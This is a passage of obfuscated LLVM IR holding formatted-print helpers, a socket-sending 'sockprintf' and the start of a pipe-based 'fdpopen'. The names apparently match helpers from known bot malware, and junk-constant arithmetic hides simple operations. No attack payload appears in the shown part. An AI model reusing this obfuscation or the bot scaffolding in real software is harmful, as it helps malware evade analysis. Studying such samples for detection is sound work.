  %131 = icmp ne i8* %130, null
  br i1 %131, label %132, label %134

; <label>:132:                                    ; preds = %124
  %133 = load i8*, i8** %11, align 8
  br label %135

; <label>:134:                                    ; preds = %124
  br label %135

; <label>:135:                                    ; preds = %134, %132
  %136 = phi i8* [ %133, %132 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), %134 ]
  %137 = load i32, i32* %7, align 4
  %138 = load i32, i32* %8, align 4
  %139 = call i32 @prints(i8** %129, i8* %136, i32 %137, i32 %138)
  %140 = load i32, i32* %9, align 4
  %141 = sub i32 %140, -1878607203
  %142 = add i32 %141, %139
  %143 = add i32 %142, -1878607203
  %144 = add nsw i32 %140, %139
  store i32 %143, i32* %9, align 4
  br label %343

; <label>:145:                                    ; preds = %101
  %146 = load i8*, i8** %5, align 8
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 100
  br i1 %149, label %150, label %183

; <label>:150:                                    ; preds = %145
  %151 = load i8**, i8*** %4, align 8
  %152 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %153 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = icmp ule i32 %154, 40
  br i1 %155, label %156, label %166

; <label>:156:                                    ; preds = %150
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %152, i32 0, i32 3
  %158 = load i8*, i8** %157, align 8
  %159 = getelementptr i8, i8* %158, i32 %154
  %160 = bitcast i8* %159 to i32*
  %161 = sub i32 0, %154
  %162 = sub i32 0, 8
  %163 = add i32 %161, %162
  %164 = sub i32 0, %163
  %165 = add i32 %154, 8
  store i32 %164, i32* %153, align 8
  br label %171

; <label>:166:                                    ; preds = %150
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %152, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %156
  %172 = phi i32* [ %160, %156 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %151, i32 %173, i32 10, i32 1, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = sub i32 0, %177
  %179 = sub i32 0, %176
  %180 = add i32 %178, %179
  %181 = sub i32 0, %180
  %182 = add nsw i32 %177, %176
  store i32 %181, i32* %9, align 4
  br label %343

; <label>:183:                                    ; preds = %145
  %184 = load i8*, i8** %5, align 8
  %185 = load i8, i8* %184, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 120
  br i1 %187, label %188, label %218

; <label>:188:                                    ; preds = %183
  %189 = load i8**, i8*** %4, align 8
  %190 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = icmp ule i32 %192, 40
  br i1 %193, label %194, label %202

; <label>:194:                                    ; preds = %188
  %195 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 3
  %196 = load i8*, i8** %195, align 8
  %197 = getelementptr i8, i8* %196, i32 %192
  %198 = bitcast i8* %197 to i32*
  %199 = sub i32 0, 8
  %200 = sub i32 %192, %199
  %201 = add i32 %192, 8
  store i32 %200, i32* %191, align 8
  br label %207

; <label>:202:                                    ; preds = %188
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 2
  %204 = load i8*, i8** %203, align 8
  %205 = bitcast i8* %204 to i32*
  %206 = getelementptr i8, i8* %204, i32 8
  store i8* %206, i8** %203, align 8
  br label %207

; <label>:207:                                    ; preds = %202, %194
  %208 = phi i32* [ %198, %194 ], [ %205, %202 ]
  %209 = load i32, i32* %208, align 4
  %210 = load i32, i32* %7, align 4
  %211 = load i32, i32* %8, align 4
  %212 = call i32 @printi(i8** %189, i32 %209, i32 16, i32 0, i32 %210, i32 %211, i32 97)
  %213 = load i32, i32* %9, align 4
  %214 = sub i32 %213, 1966968587
  %215 = add i32 %214, %212
  %216 = add i32 %215, 1966968587
  %217 = add nsw i32 %213, %212
  store i32 %216, i32* %9, align 4
  br label %343

; <label>:218:                                    ; preds = %183
  %219 = load i8*, i8** %5, align 8
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 88
  br i1 %222, label %223, label %254

; <label>:223:                                    ; preds = %218
  %224 = load i8**, i8*** %4, align 8
  %225 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = icmp ule i32 %227, 40
  br i1 %228, label %229, label %238

; <label>:229:                                    ; preds = %223
  %230 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %225, i32 0, i32 3
  %231 = load i8*, i8** %230, align 8
  %232 = getelementptr i8, i8* %231, i32 %227
  %233 = bitcast i8* %232 to i32*
  %234 = add i32 %227, 621309863
  %235 = add i32 %234, 8
  %236 = sub i32 %235, 621309863
  %237 = add i32 %227, 8
  store i32 %236, i32* %226, align 8
  br label %243

; <label>:238:                                    ; preds = %223
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %225, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  br label %243

; <label>:243:                                    ; preds = %238, %229
  %244 = phi i32* [ %233, %229 ], [ %241, %238 ]
  %245 = load i32, i32* %244, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %248 = call i32 @printi(i8** %224, i32 %245, i32 16, i32 0, i32 %246, i32 %247, i32 65)
  %249 = load i32, i32* %9, align 4
  %250 = add i32 %249, -1300242067
  %251 = add i32 %250, %248
  %252 = sub i32 %251, -1300242067
  %253 = add nsw i32 %249, %248
  store i32 %252, i32* %9, align 4
  br label %343

; <label>:254:                                    ; preds = %218
  %255 = load i8*, i8** %5, align 8
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 117
  br i1 %258, label %259, label %289

; <label>:259:                                    ; preds = %254
  %260 = load i8**, i8*** %4, align 8
  %261 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 8
  %264 = icmp ule i32 %263, 40
  br i1 %264, label %265, label %273

; <label>:265:                                    ; preds = %259
  %266 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %261, i32 0, i32 3
  %267 = load i8*, i8** %266, align 8
  %268 = getelementptr i8, i8* %267, i32 %263
  %269 = bitcast i8* %268 to i32*
  %270 = sub i32 0, 8
  %271 = sub i32 %263, %270
  %272 = add i32 %263, 8
  store i32 %271, i32* %262, align 8
  br label %278

; <label>:273:                                    ; preds = %259
  %274 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %261, i32 0, i32 2
  %275 = load i8*, i8** %274, align 8
  %276 = bitcast i8* %275 to i32*
  %277 = getelementptr i8, i8* %275, i32 8
  store i8* %277, i8** %274, align 8
  br label %278

; <label>:278:                                    ; preds = %273, %265
  %279 = phi i32* [ %269, %265 ], [ %276, %273 ]
  %280 = load i32, i32* %279, align 4
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @printi(i8** %260, i32 %280, i32 10, i32 0, i32 %281, i32 %282, i32 97)
  %284 = load i32, i32* %9, align 4
  %285 = sub i32 %284, -1456245540
  %286 = add i32 %285, %283
  %287 = add i32 %286, -1456245540
  %288 = add nsw i32 %284, %283
  store i32 %287, i32* %9, align 4
  br label %343

; <label>:289:                                    ; preds = %254
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 99
  br i1 %293, label %294, label %331

; <label>:294:                                    ; preds = %289
  %295 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %296 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 8
  %298 = icmp ule i32 %297, 40
  br i1 %298, label %299, label %309

; <label>:299:                                    ; preds = %294
  %300 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %295, i32 0, i32 3
  %301 = load i8*, i8** %300, align 8
  %302 = getelementptr i8, i8* %301, i32 %297
  %303 = bitcast i8* %302 to i32*
  %304 = sub i32 0, %297
  %305 = sub i32 0, 8
  %306 = add i32 %304, %305
  %307 = sub i32 0, %306
  %308 = add i32 %297, 8
  store i32 %307, i32* %296, align 8
  br label %314

; <label>:309:                                    ; preds = %294
  %310 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %295, i32 0, i32 2
  %311 = load i8*, i8** %310, align 8
  %312 = bitcast i8* %311 to i32*
  %313 = getelementptr i8, i8* %311, i32 8
  store i8* %313, i8** %310, align 8
  br label %314

; <label>:314:                                    ; preds = %309, %299
  %315 = phi i32* [ %303, %299 ], [ %312, %309 ]
  %316 = load i32, i32* %315, align 4
  %317 = trunc i32 %316 to i8
  %318 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %317, i8* %318, align 1
  %319 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %319, align 1
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %322 = load i32, i32* %7, align 4
  %323 = load i32, i32* %8, align 4
  %324 = call i32 @prints(i8** %320, i8* %321, i32 %322, i32 %323)
  %325 = load i32, i32* %9, align 4
  %326 = sub i32 0, %325
  %327 = sub i32 0, %324
  %328 = add i32 %326, %327
  %329 = sub i32 0, %328
  %330 = add nsw i32 %325, %324
  store i32 %329, i32* %9, align 4
  br label %343

; <label>:331:                                    ; preds = %289
  br label %342

; <label>:332:                                    ; preds = %17
  br label %333

; <label>:333:                                    ; preds = %332, %35
  %334 = load i8**, i8*** %4, align 8
  %335 = load i8*, i8** %5, align 8
  %336 = load i8, i8* %335, align 1
  %337 = zext i8 %336 to i32
  call void @printchar(i8** %334, i32 %337)
  %338 = load i32, i32* %9, align 4
  %339 = sub i32 0, 1
  %340 = sub i32 %338, %339
  %341 = add nsw i32 %338, 1
  store i32 %340, i32* %9, align 4
  br label %342

; <label>:342:                                    ; preds = %333, %331
  br label %343

; <label>:343:                                    ; preds = %342, %314, %278, %243, %207, %171, %135
  %344 = load i8*, i8** %5, align 8
  %345 = getelementptr inbounds i8, i8* %344, i32 1
  store i8* %345, i8** %5, align 8
  br label %12

; <label>:346:                                    ; preds = %29, %12
  %347 = load i8**, i8*** %4, align 8
  %348 = icmp ne i8** %347, null
  br i1 %348, label %349, label %352

; <label>:349:                                    ; preds = %346
  %350 = load i8**, i8*** %4, align 8
  %351 = load i8*, i8** %350, align 8
  store i8 0, i8* %351, align 1
  br label %352

; <label>:352:                                    ; preds = %349, %346
  %353 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %354 = bitcast %struct.__va_list_tag* %353 to i8*
  call void @llvm.va_end(i8* %354)
  %355 = load i32, i32* %9, align 4
  ret i32 %355
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %54

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, -1944772769
  %24 = add i32 %23, 1
  %25 = add i32 %24, -1944772769
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %41

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 0, %36
  %39 = add i32 %37, %38
  %40 = sub nsw i32 %37, %36
  store i32 %39, i32* %7, align 4
  br label %41

; <label>:41:                                     ; preds = %35, %34
  %42 = load i32, i32* %8, align 4
  %43 = xor i32 %42, -1
  %44 = xor i32 2, -1
  %45 = xor i32 252091272, -1
  %46 = or i32 %43, %44
  %47 = or i32 252091272, %45
  %48 = xor i32 %46, -1
  %49 = and i32 %48, %47
  %50 = and i32 %42, 2
  %51 = icmp ne i32 %49, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %41
  store i32 48, i32* %10, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %41
  br label %54

; <label>:54:                                     ; preds = %53, %4
  %55 = load i32, i32* %8, align 4
  %56 = xor i32 %55, -1
  %57 = xor i32 1, -1
  %58 = xor i32 1599670331, -1
  %59 = or i32 %56, %57
  %60 = or i32 1599670331, %58
  %61 = xor i32 %59, -1
  %62 = and i32 %61, %60
  %63 = and i32 %55, 1
  %64 = icmp ne i32 %62, 0
  br i1 %64, label %85, label %65

; <label>:65:                                     ; preds = %54
  br label %66

; <label>:66:                                     ; preds = %77, %65
  %67 = load i32, i32* %7, align 4
  %68 = icmp sgt i32 %67, 0
  br i1 %68, label %69, label %84

; <label>:69:                                     ; preds = %66
  %70 = load i8**, i8*** %5, align 8
  %71 = load i32, i32* %10, align 4
  call void @printchar(i8** %70, i32 %71)
  %72 = load i32, i32* %9, align 4
  %73 = sub i32 %72, 2016748073
  %74 = add i32 %73, 1
  %75 = add i32 %74, 2016748073
  %76 = add nsw i32 %72, 1
  store i32 %75, i32* %9, align 4
  br label %77

; <label>:77:                                     ; preds = %69
  %78 = load i32, i32* %7, align 4
  %79 = sub i32 0, %78
  %80 = sub i32 0, -1
  %81 = add i32 %79, %80
  %82 = sub i32 0, %81
  %83 = add nsw i32 %78, -1
  store i32 %82, i32* %7, align 4
  br label %66

; <label>:84:                                     ; preds = %66
  br label %85

; <label>:85:                                     ; preds = %84, %54
  br label %86

; <label>:86:                                     ; preds = %100, %85
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %103

; <label>:90:                                     ; preds = %86
  %91 = load i8**, i8*** %5, align 8
  %92 = load i8*, i8** %6, align 8
  %93 = load i8, i8* %92, align 1
  %94 = zext i8 %93 to i32
  call void @printchar(i8** %91, i32 %94)
  %95 = load i32, i32* %9, align 4
  %96 = sub i32 %95, 1855546133
  %97 = add i32 %96, 1
  %98 = add i32 %97, 1855546133
  %99 = add nsw i32 %95, 1
  store i32 %98, i32* %9, align 4
  br label %100

; <label>:100:                                    ; preds = %90
  %101 = load i8*, i8** %6, align 8
  %102 = getelementptr inbounds i8, i8* %101, i32 1
  store i8* %102, i8** %6, align 8
  br label %86

; <label>:103:                                    ; preds = %86
  br label %104

; <label>:104:                                    ; preds = %114, %103
  %105 = load i32, i32* %7, align 4
  %106 = icmp sgt i32 %105, 0
  br i1 %106, label %107, label %119

; <label>:107:                                    ; preds = %104
  %108 = load i8**, i8*** %5, align 8
  %109 = load i32, i32* %10, align 4
  call void @printchar(i8** %108, i32 %109)
  %110 = load i32, i32* %9, align 4
  %111 = sub i32 0, 1
  %112 = sub i32 %110, %111
  %113 = add nsw i32 %110, 1
  store i32 %112, i32* %9, align 4
  br label %114

; <label>:114:                                    ; preds = %107
  %115 = load i32, i32* %7, align 4
  %116 = sub i32 0, -1
  %117 = sub i32 %115, %116
  %118 = add nsw i32 %115, -1
  store i32 %117, i32* %7, align 4
  br label %104

; <label>:119:                                    ; preds = %104
  %120 = load i32, i32* %9, align 4
  ret i32 %120
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %130

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = add i32 0, -461841372
  %45 = sub i32 %44, %43
  %46 = sub i32 %45, -461841372
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %78, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %90

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %78

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 %63, 1805278990
  %65 = sub i32 %64, 48
  %66 = add i32 %65, 1805278990
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 %66, 919826867
  %69 = sub i32 %68, 10
  %70 = add i32 %69, 919826867
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, %70
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, %70
  store i32 %76, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %56
  %79 = load i32, i32* %18, align 4
  %80 = sub i32 %79, -2024083442
  %81 = add i32 %80, 48
  %82 = add i32 %81, -2024083442
  %83 = add nsw i32 %79, 48
  %84 = trunc i32 %82 to i8
  %85 = load i8*, i8** %17, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 -1
  store i8* %86, i8** %17, align 8
  store i8 %84, i8* %86, align 1
  %87 = load i32, i32* %11, align 4
  %88 = load i32, i32* %21, align 4
  %89 = udiv i32 %88, %87
  store i32 %89, i32* %21, align 4
  br label %53

; <label>:90:                                     ; preds = %53
  %91 = load i32, i32* %19, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %119

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %13, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %115

; <label>:96:                                     ; preds = %93
  %97 = load i32, i32* %14, align 4
  %98 = xor i32 2, -1
  %99 = xor i32 %97, %98
  %100 = and i32 %99, %97
  %101 = and i32 %97, 2
  %102 = icmp ne i32 %100, 0
  br i1 %102, label %103, label %115

; <label>:103:                                    ; preds = %96
  %104 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %104, i32 45)
  %105 = load i32, i32* %20, align 4
  %106 = add i32 %105, -886339195
  %107 = add i32 %106, 1
  %108 = sub i32 %107, -886339195
  %109 = add nsw i32 %105, 1
  store i32 %108, i32* %20, align 4
  %110 = load i32, i32* %13, align 4
  %111 = add i32 %110, -450657602
  %112 = add i32 %111, -1
  %113 = sub i32 %112, -450657602
  %114 = add nsw i32 %110, -1
  store i32 %113, i32* %13, align 4
  br label %118

; <label>:115:                                    ; preds = %96, %93
  %116 = load i8*, i8** %17, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 -1
  store i8* %117, i8** %17, align 8
  store i8 45, i8* %117, align 1
  br label %118

; <label>:118:                                    ; preds = %115, %103
  br label %119

; <label>:119:                                    ; preds = %118, %90
  %120 = load i32, i32* %20, align 4
  %121 = load i8**, i8*** %9, align 8
  %122 = load i8*, i8** %17, align 8
  %123 = load i32, i32* %13, align 4
  %124 = load i32, i32* %14, align 4
  %125 = call i32 @prints(i8** %121, i8* %122, i32 %123, i32 %124)
  %126 = add i32 %120, 916560548
  %127 = add i32 %126, %125
  %128 = sub i32 %127, 916560548
  %129 = add nsw i32 %120, %125
  store i32 %128, i32* %8, align 4
  br label %130

; <label>:130:                                    ; preds = %119, %25
  %131 = load i32, i32* %8, align 4
  ret i32 %131
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
